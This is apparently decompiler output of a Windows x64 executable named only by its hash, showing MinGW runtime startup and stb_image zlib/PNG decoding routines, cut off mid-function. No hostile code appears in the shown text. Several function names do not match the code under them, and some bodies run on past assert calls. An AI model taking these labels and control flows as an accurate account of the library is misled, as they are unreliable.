/* Decompiled from: 7290353a3bc2b18e9ea574d3294b09e28edaa6b038285bb101cf09760f187dcd */

/* crt_noop @ 140001000 */

void crt_noop(void)

{
  return;
}



/* crt_init @ 140001010 */

/* WARNING: Removing unreachable block (ram,0x000140001110) */
/* WARNING: Removing unreachable block (ram,0x00014000111a) */

undefined8 crt_init(void)

{
  undefined4 *puVar1;
  
  g_crt_flag_1 = 1;
  g_crt_flag_2 = 1;
  g_crt_flag_3 = 1;
  g_crt_flag_4 = 0;
  if (g_app_type == 0) {
    __set_app_type(1);
  }
  else {
    __set_app_type(2);
  }
  puVar1 = (undefined4 *)FUN_140009570();
  *puVar1 = g_crt_param_1;
  puVar1 = (undefined4 *)FUN_140009580();
  *puVar1 = g_crt_param_2;
  crt_stub_return_zero();
  if (g_crt_init_flag != 1) {
    return 0;
  }
  FUN_140008980(crt_matherr_handler);
  return 0;
}



/* crt_startup @ 140001130 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void crt_startup(void)

{
  _DAT_14002f004 = DAT_14002f0f0;
  __getmainargs(&DAT_14002f028,&DAT_14002f020,&DAT_14002f018,DAT_14002f0e0,&DAT_14002f004);
  return;
}



/* mingw_crt_startup @ 140001180 */

ulonglong mingw_crt_startup(undefined4 *param_1,undefined *param_2,undefined8 param_3,undefined8 param_4
                       )

{
  int iVar1;
  longlong lVar2;
  bool bVar3;
  int iVar4;
  longlong lVar5;
  undefined8 *puVar6;
  size_t sVar7;
  void *_Dst;
  ulonglong uVar8;
  undefined8 uVar9;
  undefined8 uVar10;
  longlong lVar11;
  size_t _Size;
  undefined8 *puVar12;
  longlong unaff_GS_OFFSET;
  
  lVar2 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);
  while( true ) {
    LOCK();
    lVar11 = 0;
    lVar5 = lVar2;
    if (DAT_14002f0d0 != 0) {
      lVar11 = DAT_14002f0d0;
      lVar5 = DAT_14002f0d0;
    }
    DAT_14002f0d0 = lVar5;
    UNLOCK();
    if (lVar11 == 0) break;
    if (lVar2 == lVar11) {
      bVar3 = true;
joined_r0x0001400011db:
      if (DAT_14002f0d8 == 1) {
        _amsg_exit(0x1f);
      }
      else if (DAT_14002f0d8 == 0) {
        DAT_14002f0d8 = 1;
        _initterm();
      }
      else {
        DAT_14002f008 = 1;
      }
      if (DAT_14002f0d8 == 1) {
        _initterm();
        DAT_14002f0d8 = 2;
      }
      if (!bVar3) {
        LOCK();
        DAT_14002f0d0 = 0;
        UNLOCK();
      }
      uVar10 = 2;
      uVar9 = 0;
      tls_callback_0(0,2);
      FUN_1400085e0(uVar9,uVar10,param_3,param_4);
      DAT_14002f160 = SetUnhandledExceptionFilter(FUN_140008990);
      FUN_1400095b0(crt_noop);
      FUN_1400083f0();
      iVar4 = DAT_14002f028;
      iVar1 = DAT_14002f028 + 1;
      _Size = (longlong)iVar1 * 8;
      puVar6 = (undefined8 *)malloc(_Size);
      lVar2 = (longlong)DAT_14002f020;
      puVar12 = puVar6;
      if (0 < iVar4) {
        lVar11 = 0;
        do {
          sVar7 = strlen(*(char **)(lVar2 + lVar11));
          _Dst = malloc(sVar7 + 1);
          *(void **)((longlong)puVar6 + lVar11) = _Dst;
          puVar12 = (undefined8 *)(lVar2 + lVar11);
          lVar11 = lVar11 + 8;
          memcpy(_Dst,(void *)*puVar12,sVar7 + 1);
        } while (_Size - 8 != lVar11);
        puVar12 = puVar6 + (longlong)iVar1 + -1;
      }
      *puVar12 = 0;
      DAT_14002f020 = puVar6;
      crt_init_console();
      *(undefined8 *)__initenv_exref = DAT_14002f018;
      uVar8 = main_entry();
      DAT_14002f010 = (uint)uVar8;
      if (g_crt_flag_4 != 0) {
        if (DAT_14002f008 != 0) {
          return uVar8;
        }
        _cexit();
        return (ulonglong)DAT_14002f010;
      }
                    /* WARNING: Subroutine does not return */
      exit(DAT_14002f010);
    }
    Sleep(1000);
  }
  bVar3 = false;
  goto joined_r0x0001400011db;
}



/* entry @ 1400013d0 */

void entry(undefined4 *param_1,undefined *param_2,undefined8 param_3,undefined8 param_4)

{
  g_app_type = 1;
  mingw_crt_startup(param_1,param_2,param_3,param_4);
  return;
}



/* crt_atexit @ 1400013f0 */

void crt_atexit(undefined4 *param_1,undefined *param_2,undefined8 param_3,undefined8 param_4)

{
  g_app_type = 0;
  mingw_crt_startup(param_1,param_2,param_3,param_4);
  return;
}



/* FUN_140001410 @ 140001410 */

int FUN_140001410(_onexit_t param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = _onexit(param_1);
  return -(uint)(p_Var1 == (_onexit_t)0x0);
}



/* FUN_140001430 @ 140001430 */

void FUN_140001430(void)

{
  FUN_140001410(FUN_140001440);
  return;
}



/* FUN_140001440 @ 140001440 */

void FUN_140001440(void)

{
  return;
}



/* FUN_140001480 @ 140001480 */

void FUN_140001480(longlong param_1)

{
  longlong lVar1;
  int iVar2;
  longlong lVar3;
  
  lVar1 = param_1 + 0x38;
  iVar2 = (**(code **)(param_1 + 0x10))
                    (*(undefined8 *)(param_1 + 0x28),lVar1,*(undefined4 *)(param_1 + 0x34));
  *(int *)(param_1 + 0xb8) =
       *(int *)(param_1 + 0xb8) +
       ((int)*(undefined8 *)(param_1 + 0xc0) - (int)*(undefined8 *)(param_1 + 0xd0));
  if (iVar2 == 0) {
    *(undefined4 *)(param_1 + 0x30) = 0;
    lVar3 = param_1 + 0x39;
    *(undefined1 *)(param_1 + 0x38) = 0;
  }
  else {
    lVar3 = iVar2 + lVar1;
  }
  *(longlong *)(param_1 + 200) = lVar3;
  *(longlong *)(param_1 + 0xc0) = lVar1;
  return;
}



/* stbi_zlib_decode @ 1400014f0 */

uint stbi_zlib_decode(int param_1)

{
  uint uVar1;
  
  uVar1 = param_1 >> 1 & 0x5555U | param_1 * 2 & 0xaaaaU;
  uVar1 = (int)uVar1 >> 2 & 0x3333U | (uVar1 & 0x3333) << 2;
  uVar1 = (int)uVar1 >> 4 & 0xf0fU | (uVar1 & 0xf0f) << 4;
  return (int)uVar1 >> 8 | (uVar1 & 0xff) << 8;
}



/* stbi_inflate_main @ 140001540 */

void stbi_inflate_main(longlong *param_1)

{
  byte *pbVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = *(uint *)(param_1 + 3);
  iVar2 = (int)param_1[2];
  do {
    if (uVar3 >> ((byte)iVar2 & 0x1f) != 0) {
      *param_1 = param_1[1];
      return;
    }
    pbVar1 = (byte *)*param_1;
    if (pbVar1 < (byte *)param_1[1]) {
      *param_1 = (longlong)(pbVar1 + 1);
      uVar3 = uVar3 | (uint)*pbVar1 << ((byte)iVar2 & 0x1f);
    }
    iVar2 = iVar2 + 8;
    *(uint *)(param_1 + 3) = uVar3;
    *(int *)(param_1 + 2) = iVar2;
  } while (iVar2 < 0x19);
  return;
}



/* stbi_inflate_block @ 140001590 */

uint stbi_inflate_block(ulonglong *param_1,longlong param_2)

{
  ushort uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  byte bVar5;
  longlong lVar6;
  uint uVar7;
  uint uVar8;
  
  if ((int)param_1[2] < 0x10) {
    if (*param_1 < param_1[1]) {
      stbi_inflate_main((longlong *)param_1);
    }
    else {
      if (*(int *)((longlong)param_1 + 0x14) != 0) {
        return 0xffffffff;
      }
      *(undefined4 *)((longlong)param_1 + 0x14) = 1;
      *(int *)(param_1 + 2) = (int)param_1[2] + 0x10;
    }
  }
  uVar7 = (uint)param_1[3];
  uVar1 = *(ushort *)(param_2 + (ulonglong)(uVar7 & 0x1ff) * 2);
  if (uVar1 == 0) {
    uVar3 = stbi_zlib_decode(uVar7);
    if ((int)uVar3 < *(int *)(param_2 + 0x448)) {
      bVar5 = 6;
      uVar8 = 10;
    }
    else {
      lVar2 = 0xb;
      do {
        lVar6 = lVar2;
        lVar2 = lVar6 + 1;
      } while (*(int *)(param_2 + 0x41c + (lVar6 + 1) * 4) <= (int)uVar3);
      uVar8 = (uint)lVar6;
      if (uVar8 == 0x10) {
        return 0xffffffff;
      }
      bVar5 = 0x10 - (char)lVar6;
    }
    iVar4 = (((int)uVar3 >> (bVar5 & 0x1f)) -
            (uint)*(ushort *)(param_2 + 0x400 + (longlong)(int)uVar8 * 2)) +
            (uint)*(ushort *)(param_2 + 0x464 + (longlong)(int)uVar8 * 2);
    if ((iVar4 < 0x120) && (*(byte *)(param_2 + 0x484 + (longlong)iVar4) == uVar8)) {
      *(uint *)(param_1 + 2) = (int)param_1[2] - uVar8;
      uVar1 = *(ushort *)(param_2 + 0x5a4 + (longlong)iVar4 * 2);
      *(uint *)(param_1 + 3) = uVar7 >> ((byte)uVar8 & 0x1f);
      return (uint)uVar1;
    }
    return 0xffffffff;
  }
  *(int *)(param_1 + 2) = (int)param_1[2] - ((int)(uint)uVar1 >> 9);
  *(uint *)(param_1 + 3) = uVar7 >> ((byte)((int)(uint)uVar1 >> 9) & 0x1f);
  return uVar1 & 0x1ff;
}



/* stbi_inflate_huffman @ 1400016c0 */

void stbi_inflate_huffman(undefined8 *param_1,int param_2,int param_3,int param_4)

{
  uint uVar1;
  ulonglong uVar3;
  longlong lVar4;
  undefined8 *puVar5;
  int iVar6;
  undefined8 *puVar7;
  undefined8 *puVar8;
  ulonglong uVar9;
  undefined8 *puVar10;
  ulonglong uVar11;
  undefined8 *puVar12;
  int iVar13;
  undefined8 uStack_840;
  undefined8 local_838;
  ulonglong uVar2;
  
  iVar13 = param_3 >> 1;
  uVar11 = (longlong)param_2 * (longlong)param_4;
  if (0 < iVar13) {
    iVar6 = 0;
    puVar5 = (undefined8 *)(((longlong)param_3 + -1) * uVar11 + (longlong)param_1);
    uVar9 = uVar11;
    puVar12 = puVar5;
    puVar10 = param_1;
    if (uVar11 == 0) {
      do {
        iVar6 = iVar6 + 1;
      } while (iVar6 != iVar13);
    }
    else {
      do {
        do {
          uVar2 = 0x800;
          if (uVar9 < 0x801) {
            uVar2 = uVar9;
          }
          uVar1 = (uint)uVar2;
          puVar7 = param_1;
          puVar8 = &local_838;
          if (7 < uVar1) {
            puVar8 = &local_838;
            for (uVar3 = uVar2 >> 3 & 0x1fffffff; uVar3 != 0; uVar3 = uVar3 - 1) {
              *puVar8 = *puVar7;
              puVar7 = puVar7 + 1;
              puVar8 = puVar8 + 1;
            }
          }
          lVar4 = 0;
          if ((uVar2 & 4) != 0) {
            *(undefined4 *)puVar8 = *(undefined4 *)puVar7;
            lVar4 = 4;
          }
          if ((uVar2 & 2) != 0) {
            *(undefined2 *)((longlong)puVar8 + lVar4) = *(undefined2 *)((longlong)puVar7 + lVar4);
            lVar4 = lVar4 + 2;
          }
          if ((uVar2 & 1) != 0) {
            *(undefined1 *)((longlong)puVar8 + lVar4) = *(undefined1 *)((longlong)puVar7 + lVar4);
          }
          if (uVar1 < 8) {
            if ((uVar2 & 4) == 0) {
              if ((uVar1 != 0) && (*(undefined1 *)param_1 = *(undefined1 *)puVar5, (uVar2 & 2) != 0)
                 ) {
                *(undefined2 *)((longlong)param_1 + ((uVar2 & 0xffffffff) - 2)) =
                     *(undefined2 *)((longlong)puVar5 + ((uVar2 & 0xffffffff) - 2));
              }
            }
            else {
              *(undefined4 *)param_1 = *(undefined4 *)puVar5;
              *(undefined4 *)((longlong)param_1 + ((uVar2 & 0xffffffff) - 4)) =
                   *(undefined4 *)((longlong)puVar5 + ((uVar2 & 0xffffffff) - 4));
            }
            if (7 < uVar1) goto LAB_140001810;
LAB_14000175b:
            if ((uVar2 & 4) == 0) {
              if (uVar1 != 0) {
                *(undefined1 *)puVar5 = (undefined1)local_838;
                if ((uVar2 & 2) != 0) {
                  *(undefined2 *)((longlong)puVar5 + ((uVar2 & 0xffffffff) - 2)) =
                       *(undefined2 *)((longlong)&uStack_840 + (uVar2 & 0xffffffff) + 6);
                }
              }
            }
            else {
              *(undefined4 *)puVar5 = (undefined4)local_838;
              *(undefined4 *)((longlong)puVar5 + ((uVar2 & 0xffffffff) - 4)) =
                   *(undefined4 *)((longlong)&uStack_840 + (uVar2 & 0xffffffff) + 4);
            }
          }
          else {
            *param_1 = *puVar5;
            *(undefined8 *)((longlong)param_1 + ((uVar2 & 0xffffffff) - 8)) =
                 *(undefined8 *)((longlong)puVar5 + ((uVar2 & 0xffffffff) - 8));
            lVar4 = (longlong)param_1 - (longlong)((ulonglong)(param_1 + 1) & 0xfffffffffffffff8);
            puVar7 = (undefined8 *)((longlong)puVar5 - lVar4);
            puVar8 = (undefined8 *)((ulonglong)(param_1 + 1) & 0xfffffffffffffff8);
            for (uVar3 = (ulonglong)((int)lVar4 + uVar1 >> 3); uVar3 != 0; uVar3 = uVar3 - 1) {
              *puVar8 = *puVar7;
              puVar7 = puVar7 + 1;
              puVar8 = puVar8 + 1;
            }
            if (uVar1 < 8) goto LAB_14000175b;
LAB_140001810:
            *puVar5 = CONCAT44(local_838._4_4_,(undefined4)local_838);
            *(undefined8 *)((longlong)puVar5 + ((uVar2 & 0xffffffff) - 8)) =
                 *(undefined8 *)((longlong)&uStack_840 + (uVar2 & 0xffffffff));
            lVar4 = (longlong)puVar5 - (longlong)((ulonglong)(puVar5 + 1) & 0xfffffffffffffff8);
            puVar7 = (undefined8 *)((longlong)&local_838 - lVar4);
            puVar8 = (undefined8 *)((ulonglong)(puVar5 + 1) & 0xfffffffffffffff8);
            for (uVar3 = (ulonglong)((int)lVar4 + uVar1 >> 3); uVar3 != 0; uVar3 = uVar3 - 1) {
              *puVar8 = *puVar7;
              puVar7 = puVar7 + 1;
              puVar8 = puVar8 + 1;
            }
          }
          uVar9 = uVar9 - uVar2;
          puVar5 = (undefined8 *)((longlong)puVar5 + uVar2);
          param_1 = (undefined8 *)((longlong)param_1 + uVar2);
        } while (uVar9 != 0);
        iVar6 = iVar6 + 1;
        param_1 = (undefined8 *)((longlong)puVar10 + uVar11);
        puVar5 = (undefined8 *)((longlong)puVar12 - uVar11);
        uVar9 = uVar11;
        puVar12 = puVar5;
        puVar10 = param_1;
      } while (iVar6 != iVar13);
    }
  }
  return;
}



/* stbi_compute_huffman_codes @ 1400018d0 */

void stbi_compute_huffman_codes(longlong param_1,int param_2)

{
  int iVar1;
  
  if (param_2 != 0) {
    if (param_2 < 0) {
      *(undefined8 *)(param_1 + 0xc0) = *(undefined8 *)(param_1 + 200);
      return;
    }
    if (*(longlong *)(param_1 + 0x10) != 0) {
      iVar1 = (int)*(undefined8 *)(param_1 + 200) - (int)*(longlong *)(param_1 + 0xc0);
      if (iVar1 < param_2) {
        *(undefined8 *)(param_1 + 0xc0) = *(undefined8 *)(param_1 + 200);
                    /* WARNING: Could not recover jumptable at 0x000140001935. Too many branches */
                    /* WARNING: Treating indirect jump as call */
        (**(code **)(param_1 + 0x18))(*(undefined8 *)(param_1 + 0x28),param_2 - iVar1);
        return;
      }
    }
    *(longlong *)(param_1 + 0xc0) = *(longlong *)(param_1 + 0xc0) + (longlong)param_2;
  }
  return;
}



/* stbi_build_huffman @ 140001940 */

ulonglong stbi_build_huffman(longlong param_1,longlong param_2,int param_3,int param_4)

{
  void *_Memory;
  uint uVar1;
  ulonglong in_RAX;
  ulonglong uVar2;
  undefined8 *puVar3;
  void *pvVar4;
  char *pcVar5;
  uint uVar6;
  undefined1 *puVar7;
  char *pcVar8;
  uint uVar9;
  
  if (param_4 == 1) {
    if (-1 < (int)(param_3 - 1U)) {
      uVar2 = (ulonglong)(param_3 - 1U);
      do {
        *(undefined1 *)(param_1 + 1 + uVar2 * 2) = 0xff;
        *(undefined1 *)(param_1 + uVar2 * 2) = *(undefined1 *)(param_2 + uVar2);
        uVar2 = uVar2 - 1;
      } while (-1 < (int)uVar2);
      return uVar2;
    }
  }
  else {
    if (param_4 != 3) {
      uVar1 = 0x124d;
      pcVar8 = "stb_image.h";
      pcVar5 = "img_n == 3";
      _assert();
      *(char **)(pcVar5 + 0x20) = pcVar8;
      if (*(int *)(pcVar5 + 0x38) == 0) {
        puVar3 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar3 = "output buffer limit";
      }
      else {
        _Memory = *(void **)(pcVar5 + 0x28);
        uVar9 = (uint)((longlong)pcVar8 - (longlong)_Memory);
        if (!CARRY4(uVar1,uVar9)) {
          uVar6 = (uint)(*(longlong *)(pcVar5 + 0x30) - (longlong)_Memory);
          uVar2 = *(longlong *)(pcVar5 + 0x30) - (longlong)_Memory & 0xffffffff;
          while (uVar6 < uVar1 + uVar9) {
            if ((int)uVar2 < 0) goto LAB_140001a6b;
            uVar6 = (int)uVar2 * 2;
            uVar2 = (ulonglong)uVar6;
          }
          pvVar4 = realloc(_Memory,(ulonglong)uVar6);
          if (pvVar4 != (void *)0x0) {
            *(void **)(pcVar5 + 0x28) = pvVar4;
            *(ulonglong *)(pcVar5 + 0x30) = (longlong)pvVar4 + (ulonglong)uVar6;
            *(ulonglong *)(pcVar5 + 0x20) =
                 ((longlong)pcVar8 - (longlong)_Memory & 0xffffffffU) + (longlong)pvVar4;
            return 1;
          }
        }
LAB_140001a6b:
        puVar3 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
        *puVar3 = "outofmem";
      }
      return 0;
    }
    uVar1 = param_3 - 1;
    in_RAX = (ulonglong)uVar1;
    if (-1 < (int)uVar1) {
      in_RAX = (ulonglong)uVar1;
      puVar7 = (undefined1 *)(param_2 + (param_3 * 3 + -3));
      do {
        *(undefined1 *)(param_1 + 3 + in_RAX * 4) = 0xff;
        *(undefined1 *)(param_1 + 2 + in_RAX * 4) = puVar7[2];
        *(undefined1 *)(param_1 + 1 + in_RAX * 4) = puVar7[1];
        *(undefined1 *)(param_1 + in_RAX * 4) = *puVar7;
        in_RAX = in_RAX - 1;
        puVar7 = puVar7 + -3;
      } while (-1 < (int)in_RAX);
    }
  }
  return in_RAX;
}



/* stbi_parse_zlib_header @ 140001a20 */

undefined8 stbi_parse_zlib_header(longlong param_1,longlong param_2,uint param_3)

{
  void *_Memory;
  undefined8 *puVar1;
  void *pvVar2;
  uint uVar3;
  ulonglong uVar4;
  uint uVar5;
  
  *(longlong *)(param_1 + 0x20) = param_2;
  if (*(int *)(param_1 + 0x38) == 0) {
    puVar1 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar1 = "output buffer limit";
  }
  else {
    _Memory = *(void **)(param_1 + 0x28);
    uVar5 = (uint)(param_2 - (longlong)_Memory);
    if (!CARRY4(param_3,uVar5)) {
      uVar4 = *(longlong *)(param_1 + 0x30) - (longlong)_Memory;
      uVar3 = (uint)uVar4;
      uVar4 = uVar4 & 0xffffffff;
      while (uVar3 < param_3 + uVar5) {
        if ((int)uVar4 < 0) goto LAB_140001a6b;
        uVar3 = (int)uVar4 * 2;
        uVar4 = (ulonglong)uVar3;
      }
      pvVar2 = realloc(_Memory,(ulonglong)uVar3);
      if (pvVar2 != (void *)0x0) {
        *(void **)(param_1 + 0x28) = pvVar2;
        *(ulonglong *)(param_1 + 0x30) = (longlong)pvVar2 + (ulonglong)uVar3;
        *(ulonglong *)(param_1 + 0x20) =
             (param_2 - (longlong)_Memory & 0xffffffffU) + (longlong)pvVar2;
        return 1;
      }
    }
LAB_140001a6b:
    puVar1 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar1 = "outofmem";
  }
  return 0;
}



/* stbi_parse_uncompressed_block @ 140001ae0 */

undefined8 stbi_parse_uncompressed_block(undefined8 *param_1,byte *param_2,int param_3)

{
  byte bVar1;
  int iVar2;
  undefined1 auVar3 [16];
  uint uVar4;
  byte *pbVar5;
  longlong lVar6;
  undefined8 *puVar7;
  ulonglong uVar8;
  longlong lVar9;
  int iVar10;
  int iVar11;
  longlong lVar12;
  longlong lVar13;
  byte bVar14;
  int iVar15;
  int local_c8 [16];
  undefined1 local_88 [16];
  undefined1 local_78 [16];
  undefined1 local_68 [16];
  undefined1 local_58 [16];
  undefined4 local_48;
  
  local_88 = (undefined1  [16])0x0;
  local_78 = (undefined1  [16])0x0;
  local_48 = 0;
  local_68 = (undefined1  [16])0x0;
  local_58 = (undefined1  [16])0x0;
  *param_1 = 0;
  param_1[0x7f] = 0;
  puVar7 = (undefined8 *)((ulonglong)(param_1 + 1) & 0xfffffffffffffff8);
  for (uVar8 = (ulonglong)
               (((int)param_1 - (int)(undefined8 *)((ulonglong)(param_1 + 1) & 0xfffffffffffffff8))
                + 0x400U >> 3); uVar8 != 0; uVar8 = uVar8 - 1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  if (0 < param_3) {
    pbVar5 = param_2;
    do {
      bVar1 = *pbVar5;
      pbVar5 = pbVar5 + 1;
      *(int *)(local_88 + (ulonglong)bVar1 * 4) = *(int *)(local_88 + (ulonglong)bVar1 * 4) + 1;
    } while (pbVar5 != param_2 + param_3);
  }
  lVar9 = 1;
  auVar3._12_4_ = 0;
  auVar3._0_12_ = local_88._4_12_;
  local_88 = auVar3 << 0x20;
  do {
    if (1 << ((byte)lVar9 & 0x1f) < *(int *)(local_88 + lVar9 * 4)) {
      puVar7 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
      *puVar7 = "bad sizes";
      return 0;
    }
    lVar9 = lVar9 + 1;
  } while (lVar9 != 0x10);
  lVar9 = 1;
  iVar10 = 0;
  iVar15 = 0;
  while( true ) {
    iVar2 = *(int *)(local_88 + lVar9 * 4);
    local_c8[lVar9] = iVar10;
    *(short *)((longlong)param_1 + lVar9 * 2 + 0x400) = (short)iVar10;
    *(short *)((longlong)param_1 + lVar9 * 2 + 0x464) = (short)iVar15;
    iVar11 = iVar10 + iVar2;
    if ((iVar2 != 0) && (1 << ((byte)lVar9 & 0x1f) < iVar11)) break;
    iVar15 = iVar15 + iVar2;
    iVar10 = iVar11 * 2;
    *(int *)((longlong)param_1 + lVar9 * 4 + 0x420) = iVar11 << (0x10 - (byte)lVar9 & 0x1f);
    lVar9 = lVar9 + 1;
    if (lVar9 == 0x10) {
      *(undefined4 *)(param_1 + 0x8c) = 0x10000;
      if (0 < param_3) {
        lVar9 = (longlong)param_3;
        lVar13 = 0;
        do {
          bVar1 = param_2[lVar13];
          if (bVar1 != 0) {
            lVar12 = (longlong)(int)(uint)bVar1;
            iVar10 = local_c8[lVar12];
            lVar6 = (longlong)
                    (int)((iVar10 - (uint)*(ushort *)((longlong)param_1 + lVar12 * 2 + 0x400)) +
                         (uint)*(ushort *)((longlong)param_1 + lVar12 * 2 + 0x464));
            *(byte *)((longlong)param_1 + lVar6 + 0x484) = bVar1;
            *(short *)((longlong)param_1 + lVar6 * 2 + 0x5a4) = (short)lVar13;
            if (bVar1 < 10) {
              bVar14 = bVar1;
              uVar4 = stbi_zlib_decode(iVar10);
              lVar6 = (longlong)((int)uVar4 >> (0x10 - bVar14 & 0x1f));
              do {
                *(ushort *)((longlong)param_1 + lVar6 * 2) = (ushort)bVar1 << 9 | (ushort)lVar13;
                lVar6 = lVar6 + (1 << (bVar14 & 0x1f));
              } while ((int)lVar6 < 0x200);
            }
            local_c8[lVar12] = iVar10 + 1;
          }
          lVar13 = lVar13 + 1;
        } while (lVar9 != lVar13);
      }
      return 1;
    }
  }
  puVar7 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
  *puVar7 = "bad codelengths";
  return 0;
}



/* stbi_create_png_image @ 140001d50 */

void * stbi_create_png_image(uint param_1,uint param_2,int param_3)

{
  void *pvVar1;
  int iVar2;
  
  if (-1 < (int)(param_1 | param_2)) {
    if (param_2 == 0) {
      iVar2 = 0;
      if (-1 < param_3) goto LAB_140001d95;
    }
    else if ((((int)param_1 <= (int)(0x7fffffff / (longlong)(int)param_2)) && (-1 < param_3)) &&
            ((iVar2 = param_2 * param_1, param_3 == 0 ||
             (iVar2 <= (int)(0x7fffffff / (longlong)param_3))))) {
LAB_140001d95:
      pvVar1 = malloc((longlong)(param_3 * iVar2));
      return pvVar1;
    }
  }
  return (void *)0x0;
}



/* stbi_create_png_image_raw @ 140001db0 */

int stbi_create_png_image_raw(longlong *param_1,byte *param_2,uint param_3,int param_4,uint param_5,uint param_6
                 ,int param_7,int param_8)

{
  byte *pbVar1;
  uint *puVar2;
  uint *puVar3;
  byte bVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  void *pvVar9;
  undefined8 *puVar10;
  void *_Memory;
  size_t sVar11;
  ulonglong uVar12;
  longlong lVar13;
  size_t _Size;
  uint *_Dst;
  char *pcVar14;
  byte *pbVar15;
  byte *pbVar16;
  uint uVar17;
  uint *_Dst_00;
  uint *puVar18;
  int iVar19;
  int iVar20;
  uint uVar21;
  byte bVar22;
  uint uVar23;
  byte bVar24;
  uint uVar25;
  int iVar26;
  size_t _Size_00;
  undefined1 auVar27 [16];
  int local_80;
  
  if (param_7 == 0x10) {
    iVar19 = param_4 * 2;
    iVar20 = 2;
    iVar26 = 2;
  }
  else {
    iVar20 = 1;
    iVar26 = 1;
    iVar19 = param_4;
  }
  iVar5 = *(int *)(*param_1 + 8);
  if ((param_4 != iVar5) && (iVar5 + 1 != param_4)) {
    _assert("out_n == s->img_n || out_n == s->img_n+1","stb_image.h",0x1267);
LAB_1400027e4:
    _assert("depth == 1","stb_image.h",0x12cb);
LAB_1400027fe:
    _assert("img_n == 3","stb_image.h",0x12eb);
LAB_140002818:
    pcVar14 = "img_n+1 == out_n";
    _assert("img_n+1 == out_n","stb_image.h",0x12e4);
    pbVar1 = *(byte **)(pcVar14 + 0xc0);
    pbVar16 = *(byte **)(pcVar14 + 200);
    if (pbVar1 < pbVar16) {
      pbVar15 = pbVar1 + 1;
      *(byte **)(pcVar14 + 0xc0) = pbVar15;
      bVar24 = *pbVar1;
    }
    else {
      if (*(int *)(pcVar14 + 0x30) == 0) {
        return 0;
      }
      FUN_140001480((longlong)pcVar14);
      pbVar1 = *(byte **)(pcVar14 + 0xc0);
      pbVar16 = *(byte **)(pcVar14 + 200);
      pbVar15 = pbVar1 + 1;
      *(byte **)(pcVar14 + 0xc0) = pbVar15;
      bVar24 = *pbVar1;
    }
    iVar19 = (uint)bVar24 * 0x100;
    if (pbVar15 < pbVar16) {
      *(byte **)(pcVar14 + 0xc0) = pbVar15 + 1;
      return iVar19 + (uint)*pbVar15;
    }
    if (*(int *)(pcVar14 + 0x30) != 0) {
      FUN_140001480((longlong)pcVar14);
      pbVar1 = *(byte **)(pcVar14 + 0xc0);
      *(byte **)(pcVar14 + 0xc0) = pbVar1 + 1;
      return iVar19 + (uint)*pbVar1;
    }
    return iVar19;
  }
  pvVar9 = stbi_create_png_image(param_5,param_6,iVar19);
  param_1[3] = (longlong)pvVar9;
  if (pvVar9 == (void *)0x0) {
LAB_1400027af:
    puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
    *puVar10 = "outofmem";
  }
  else {
    if ((-1 < iVar5) && (-1 < (int)param_5)) {
      if (param_5 == 0) {
        if (-1 < param_7) goto LAB_140001ee5;
      }
      else if (((iVar5 <= (int)(0x7fffffff / (longlong)(int)param_5)) && (-1 < param_7)) &&
              ((param_7 == 0 ||
               (((int)(param_5 * iVar5) <= (int)(0x7fffffff / (longlong)param_7) &&
                ((int)(param_5 * iVar5 * param_7) < 0x7ffffff9)))))) {
LAB_140001ee5:
        if (-1 < (int)param_6) {
          uVar6 = param_5 * iVar5;
          uVar7 = uVar6 * param_7 + 7 >> 3;
          if (param_6 != 0) {
            if (((int)(0x7fffffff / (longlong)(int)param_6) < (int)uVar7) ||
               ((int)(0x7fffffff - uVar7) < (int)(param_6 * uVar7))) goto LAB_140001eb0;
            if (param_3 < (uVar7 + 1) * param_6) {
              puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
              *puVar10 = "not enough pixels";
              return 0;
            }
          }
          _Memory = malloc((longlong)(int)(uVar7 * 2));
          if (_Memory != (void *)0x0) {
            local_80 = 1;
            uVar21 = uVar7;
            if (7 < param_7) {
              local_80 = iVar26 * iVar5;
              uVar21 = param_5;
            }
            if (param_6 == 0) {
LAB_140002728:
              free(_Memory);
              return 1;
            }
            _Size_00 = (size_t)local_80;
            uVar25 = 0;
            iVar19 = uVar21 * local_80;
            _Size = (size_t)iVar19;
            uVar21 = 0;
            do {
              pbVar1 = param_2 + 1;
              uVar8 = -(~uVar21 & 1) & uVar7;
              _Dst = (uint *)((ulonglong)(-(uVar21 & 1) & uVar7) + (longlong)_Memory);
              _Dst_00 = (uint *)((longlong)pvVar9 + (ulonglong)uVar25);
              uVar12 = (ulonglong)*param_2;
              if (4 < *param_2) {
                puVar10 = (undefined8 *)FUN_1400092f0((size_t *)&DAT_14000b000);
                *puVar10 = "invalid filter";
                free(_Memory);
                return 0;
              }
              if (uVar21 == 0) {
                uVar12 = (ulonglong)(byte)(&DAT_14002b439)[uVar12];
              }
              switch(uVar12) {
              case 0:
                _Dst = (uint *)memcpy(_Dst,pbVar1,_Size);
                break;
              case 1:
                _Dst = (uint *)memcpy(_Dst,pbVar1,_Size_00);
                if (local_80 < iVar19) {
                  sVar11 = _Size_00;
                  do {
                    *(byte *)((longlong)_Dst + sVar11) =
                         param_2[sVar11 + 1] + *(byte *)((longlong)_Dst + (sVar11 - _Size_00));
                    sVar11 = sVar11 + 1;
                  } while ((int)sVar11 < iVar19);
                }
                break;
              case 2:
                sVar11 = 0;
                if (iVar19 != 0) {
                  do {
                    *(byte *)((longlong)_Dst + sVar11) =
                         *(char *)((longlong)_Memory + sVar11 + uVar8) + param_2[sVar11 + 1];
                    sVar11 = sVar11 + 1;
                  } while (_Size != sVar11);
                }
                break;
              case 3:
                sVar11 = 0;
                if (local_80 != 0) {
                  do {
                    *(byte *)((longlong)_Dst + sVar11) =
